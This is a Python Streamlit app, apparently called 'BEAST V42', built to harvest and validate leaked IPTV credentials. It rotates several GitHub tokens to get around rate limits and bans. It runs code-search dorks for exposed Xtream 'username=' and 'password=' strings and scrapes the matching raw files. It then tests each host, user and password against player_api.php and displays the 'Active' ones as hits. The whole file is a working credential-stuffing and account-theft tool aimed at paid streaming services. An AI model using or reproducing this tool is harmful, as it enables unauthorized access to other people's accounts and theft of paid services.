import streamlit as st
import requests
import re
import time
import random

# إعدادات الواجهة
st.set_page_config(page_title="BEAST V42 - SILENT", layout="wide")

# نظام الدخول
if "auth" not in st.session_state: st.session_state.auth = False
if not st.session_state.auth:
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# التنسيق (أسود وأخضر فقط)
st.markdown("""
<style>
    .stApp { background-color: #000; }
    .active-hit { 
        background: #0d1117; border: 1px solid #00ff41; 
        padding: 10px; border-radius: 5px; margin-bottom: 8px;
    }
    .text-green { color: #00ff41; font-weight: bold; }
    .text-yellow { color: #fbbf24; }
    .text-white { color: #fff; font-family: monospace; }
</style>
""", unsafe_allow_html=True)

# الجانب الجانبي
with st.sidebar:
    st.title("⚡ BEAST V42")
    tokens_raw = st.text_area("Tokens (One per line):", height=150)
    tokens_list = [t.strip() for t in tokens_raw.split('\n') if t.strip()]
    pages_limit = st.slider("Depth:", 1, 100, 40)
    start = st.button("🚀 START SCAN")

# منطقة عرض النتائج فقط
st.subheader("🏆 Live Hits")
hits_area = st.container()

# المحرك الرئيسي
if start and tokens_list:
    found_count = 0
    token_index = 0
    
    # دروكات ضخمة
    dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'extension:php "panel_api.php" username password',
        'extension:env "XTREAM_USER" "XTREAM_PASSWORD"',
        'extension:json "server_url" "username"',
        'extension:log "http://" "username=" "password="',
        '"beIN" "get.php?username="',
        '"SSC" "player_api.php"',
        '"OSN" "password=" "http"',
        'extension:m3u8 "username=" "password="'
    ]
    
    for dork in dorks:
        for page in range(1, pages_limit + 1):
            current_token = tokens_list[token_index % len(tokens_list)]
            headers = {'Authorization': f'token {current_token}', 'Accept': 'application/vnd.github.v3+json'}
            
            try:
                # محاولة البحث بدون إظهار أي رسائل خطأ
                api_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100&sort=indexed"
                res = requests.get(api_url, headers=headers)
                
                # لو التوكن محظور، انقل على اللي بعده بصمت
                if res.status_code != 200:
                    token_index += 1
                    continue
                
                items = res.json().get('items', [])
                for item in items:
                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    try:
                        content = requests.get(raw_url, timeout=2).text
                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                        
                        for m in matches:
                            host, user, pw = m[0], m[1], m[2]
                            try:
                                # فحص السيرفر
                                check_api = f"{host}/player_api.php?username={user}&password={pw}"
                                r = requests.get(check_api, timeout=2).json()
                                
                                if r.get("user_info", {}).get("status") == "Active":
                                    found_count += 1
                                    with hits_area:
                                        st.markdown(f"""
                                        <div class="active-hit">
                                            <span class="text-green">✅ HIT #{found_count}</span><br>
                                            <span class="text-white">HOST: {host}</span><br>
                                            <span class="text-yellow">USER: {user} | PASS: {pw}</span>
                                        </div>
                                        """, unsafe_allow_html=True)
                            except: continue
                    except: continue
            except:
                token_index += 1
                continue
